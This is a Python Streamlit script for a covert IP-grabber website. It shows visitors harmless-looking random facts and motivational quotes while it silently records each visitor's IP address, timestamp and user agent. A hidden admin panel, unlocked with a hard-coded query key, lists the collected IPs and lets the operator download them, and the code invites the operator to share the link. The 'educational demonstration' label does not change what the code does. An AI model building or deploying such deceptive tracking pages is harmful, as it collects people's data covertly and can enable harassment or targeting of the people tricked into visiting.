import streamlit as st
import datetime
import requests
import random
import string
import pandas as pd
import time

# Set page config with random characters to make it look mysterious
random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
st.set_page_config(
    page_title=f"X{random_chars}",
    page_icon="🎯",
    layout="centered"
)

# Initialize session state for storing IPs
if 'visitor_ips' not in st.session_state:
    st.session_state.visitor_ips = []
if 'admin_mode' not in st.session_state:
    st.session_state.admin_mode = False

def get_visitor_ip():
    """Get visitor's IP address"""
    try:
        # Try multiple methods to get the real IP
        headers = st.context.headers if hasattr(st, 'context') else {}
        
        if 'x-forwarded-for' in headers:
            return headers['x-forwarded-for'].split(',')[0].strip()
        elif 'x-real-ip' in headers:
            return headers['x-real-ip']
        else:
            # Fallback: use external service
            response = requests.get('https://httpbin.org/ip', timeout=3)
            return response.json().get('origin', '').split(',')[0].strip()
    except:
        # Demo IP if all methods fail
        return f"203.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def log_visitor():
    """Automatically log visitor when they arrive"""
    visitor_ip = get_visitor_ip()
    current_time = datetime.datetime.now()
    
    # Check if this IP visited recently (last 30 seconds to avoid spam)
    for visit in st.session_state.visitor_ips:
        if visit['ip'] == visitor_ip:
            visit_time = datetime.datetime.strptime(visit['timestamp'], '%Y-%m-%d %H:%M:%S')
            if (current_time - visit_time).seconds < 30:
                return visitor_ip  # Don't log duplicate recent visits
    
    # Log the visit
    visitor_info = {
        'ip': visitor_ip,
        'timestamp': current_time.strftime('%Y-%m-%d %H:%M:%S'),
        'user_agent': st.context.headers.get('user-agent', 'Unknown')[:50] if hasattr(st, 'context') else 'Unknown'
    }
    
    st.session_state.visitor_ips.append(visitor_info)
    return visitor_ip

# Auto-log visitor (happens silently)
current_visitor_ip = log_visitor()

# Admin panel access (hidden)
admin_key = st.query_params.get("admin", "")
if admin_key == "show123":
    st.session_state.admin_mode = True

# Image template section - ADD YOUR IMAGE HERE
def show_header_image():
    """Template for adding a header image - customize this section!"""
    # UNCOMMENT AND MODIFY THE LINES BELOW TO ADD YOUR IMAGE:
    
    # Option 1: Upload image file to your project folder and reference it
    # st.image("your_image.jpg", caption="RUN. SET UR COMPUTER ON FIRE LOL", use_column_width=True)
    
    # Option 2: Use an image URL from the internet
    # st.image("https://your-image-url.com/image.jpg", caption="RUN. SET UR COMPUTER ON FIRE LOL", use_column_width=True)
    
    # Option 3: Use a placeholder image for testing (remove this when you add your real image)
    st.image(
        "IP.png", 
        caption="RUN. SET UR COMPUTER ON FIRE LOL 😂🔥", 
        use_container_width=True
    )
    
    # Add some spacing
    st.markdown("---")

# Main page content - looks innocent/fun
if not st.session_state.admin_mode:
    # Show header image first
    show_header_image()
    # Random website content that looks normal
    site_themes = [
        {
            "title": "🎯 Random Fun Generator",
            "content": """
            Welcome to our random content generator!
            
            Here are some fun random things for you:
            
            🎲 **Random Number:** {random_num}
            
            🎨 **Random Color:** #{color}
            
            🍕 **Random Food:** {food}
            
            📝 **Random Quote:** "{quote}"
            
            Thanks for visiting! Hope you enjoyed these random tidbits! 😄
            """.format(
                random_num=random.randint(1, 1000),
                color=''.join([random.choice('0123456789ABCDEF') for _ in range(6)]),
                food=random.choice(['Pizza', 'Tacos', 'Sushi', 'Ice Cream', 'Burgers', 'Pasta']),
                quote=random.choice([
                    "The best time to plant a tree was 20 years ago. The second best time is now.",
                    "Life is what happens to you while you're busy making other plans.",
                    "The only way to do great work is to love what you do.",
                    "Innovation distinguishes between a leader and a follower."
                ])
            )
        },
        {
            "title": "🌟 Daily Motivation Hub",
            "content": """
            Welcome to your daily dose of motivation!
            
            ✨ **Today's Affirmation:**
            "You are capable of amazing things!"
            
            🏆 **Success Tip #{tip_num}:**
            {tip}
            
            🎯 **Your Lucky Number Today:** {lucky}
            
            Have a fantastic day! 🌈
            """.format(
                tip_num=random.randint(1, 100),
                tip=random.choice([
                    "Start with small, achievable goals",
                    "Celebrate your progress, no matter how small",
                    "Focus on what you can control",
                    "Learn something new every day"
                ]),
                lucky=random.randint(1, 99)
            )
        }
    ]
    
    theme = random.choice(site_themes)
    st.title(theme["title"])
    st.markdown(theme["content"])
    
    # Add some interactive elements to make it feel more real
    if st.button("🎲 Generate New Random Content"):
        st.rerun()
    
    # Innocent footer
    st.markdown("---")
    st.markdown("*Just a simple fun website! 🎉*")

else:
    # Admin panel - show collected IPs
    st.title("🕵️ Admin Panel - IP Collection Results")
    st.markdown("*Educational demonstration results*")
    
    if st.session_state.visitor_ips:
        st.success(f"✅ Successfully collected {len(st.session_state.visitor_ips)} visitor IPs!")
        
        # Create DataFrame for better display
        df = pd.DataFrame(st.session_state.visitor_ips)
        st.dataframe(df, use_container_width=True)
        
        # Download as TXT
        txt_content = "IP Address Collection Results\n"
        txt_content += "="*40 + "\n"
        txt_content += f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        txt_content += f"Total IPs collected: {len(st.session_state.visitor_ips)}\n"
        txt_content += "="*40 + "\n\n"
        
        for i, visitor in enumerate(st.session_state.visitor_ips, 1):
            txt_content += f"{i:3d}. {visitor['ip']} - {visitor['timestamp']}\n"
        
        st.download_button(
            label="📁 Download IP List as TXT",
            data=txt_content,
            file_name=f"collected_ips_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            mime="text/plain"
        )
        
        # Statistics
        st.markdown("### 📊 Statistics")
        unique_ips = len(set([v['ip'] for v in st.session_state.visitor_ips]))
        st.metric("Unique IPs", unique_ips)
        st.metric("Total Visits", len(st.session_state.visitor_ips))
        
        # Clear data button
        if st.button("🗑️ Clear All Data", type="secondary"):
            st.session_state.visitor_ips = []
            st.success("Data cleared!")
            st.rerun()
            
    else:
        st.info("No visitors yet! Share the link to start collecting IPs.")
    
    st.markdown("---")
    st.markdown("**Admin Access Info:**")
    st.code(f"Main Site: [Your URL]\nAdmin Panel: [Your URL]?admin=show123")
    
    # Real-time update
    if st.button("🔄 Refresh Data"):
        st.rerun()

# Show current visitor their IP in admin mode
if st.session_state.admin_mode:
    st.sidebar.success(f"Current Visitor IP: `{current_visitor_ip}`")
    st.sidebar.info(f"Total IPs Collected: {len(st.session_state.visitor_ips)}")